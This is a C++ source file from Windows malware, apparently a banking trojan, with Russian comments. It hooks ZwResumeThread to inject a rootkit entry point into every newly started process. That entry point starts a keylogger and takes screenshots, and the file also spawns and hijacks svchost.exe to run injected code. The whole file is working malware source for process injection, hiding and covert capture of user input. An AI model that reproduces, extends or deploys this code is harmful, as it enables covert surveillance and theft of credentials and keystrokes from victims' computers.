#include "main.h"
#include "core\hook.h"
#include "keylogger.h"
#include "core\util.h"
#include "core\path.h"
#include "system.h"

struct FuncParam
{
	typeFuncParamDWORD func;
	DWORD param;
	DWORD pid;
};

static FuncParam funcInject; //функция вызываемая из FuncZwResumeThread для инжекта в какой-то процесс
static DWORD injectPID; //в какой процесс инжектимся, чтобы хук FuncZwResumeThread для него не выполнялся
static DWORD injectPID2; //ид процесса в который внедряемся

#ifndef WIN64

//функция запускается при запуске нового процесса
DWORD WINAPI RootkitEntry( void* )
{
	InitBot();
	StringBuilderStack<MAX_PATH> path;
	Path::GetStartupExe(path);
	DbgMsg( "Запущен процесс %s", path.c_str() );
	path.Lower();
	StringBuilderStack<64> nameProcess = Path::GetFileName( path.c_str() );
	Path::GetPathName(path);
	KeyLoggerAllChars::Start(nameProcess);
	System::Start( nameProcess.Hash(), nameProcess, path );
	Screenshot::Init();
	StartKeyLoggerFirstNScreenshot(5);
	return 0;
}

static bool FuncZwResumeThread( Hook::ParamsZwResumeThread& params )
{
	DWORD pid = Process::GetPID( params.hThread );
	FuncParam* fp = (FuncParam*)params.tag;
	if( pid && pid != Process::CurrentPID() && pid != fp->pid && pid != injectPID )
	{
		if( fp->func ) //нужно выполнить нашу функцию
		{
			typeFuncParamDWORD func = fp->func;
			DWORD param = fp->param;
			fp->func = 0; //отключаем, чтобы в следующий раз не выполняло
			fp->param = 0;
			fp->pid = pid; //чтобы для этого ида ничего не выполнялось
			func(param);
		}
		else //инжект в запускаемый процесс
			InjectIntoProcess3( pid, params.hThread, RootkitEntry );
	}
	return false;
}

bool InjectCrossRootkit( typeFuncParamDWORD func, DWORD param )
{
	//устанавливаем параметры запуска
	funcInject.func = func;
	funcInject.param = param;
	funcInject.pid = 0;
	injectPID = 0;
	//запускаем svchost, в результате вызовится хук FuncZwResumeThread, а svchost.exe завершит работу
	StringBuilder cmd(512);
	if( !Path::GetSystemDirectore(cmd) ) return false;
	Path::AppendFile( cmd, _CS_( "svchost.exe" ) );
	return Process::Exec(cmd) != 0;
}

static void InjectToProcessRootkit( DWORD param )
{
	InjectIntoProcess2( injectPID2, (typeFuncThread)param );
}

bool InjectToProcessRootkit( DWORD pid, typeFuncThread func )
{
	injectPID2 = pid;
	return InjectCrossRootkit( InjectToProcessRootkit, (DWORD)func );
}

static HANDLE svchostProcess;
static HANDLE svchostThread;

static void JumpInSvchostRootkit( DWORD param )
{
	RunInjectCode( svchostProcess, svchostThread, (typeFuncThread)param, &InjectCode2 );
}

DWORD JumpInSvchostRootkit( typeFuncThread func )
{
	Mem::Zero(funcInject);
	DWORD pid = RunSvchost( &svchostProcess, &svchostThread, Config::exeDonor );
	if( pid )
	{
		if( InjectCrossRootkit( JumpInSvchostRootkit, (DWORD)func ) )
			return pid;
	}
	return 0;
/*
	StringBuilder cmd(512);
	if( !Path::GetSystemDirectore(cmd) ) return false;
	Path::AppendFile( cmd, _CS_( "svchost.exe -k netsvcs" ) );
	DWORD pid = Process::Exec(cmd);
	if( pid == 0 ) return false;
	if( InjectToProcessRootkit( pid, func ) )
		return pid;
*/
	return 0;
}


#endif //WIN64

bool InitRootkit()
{
#ifdef WIN64
	return false;
#else 
	Mem::Zero(funcInject);
	if( !Hook::Join_ZwResumeThread( FuncZwResumeThread, &funcInject, true ) ) return false;
	return true;
#endif
}

void SetInjectPID( DWORD pid )
{
	injectPID = pid;
}
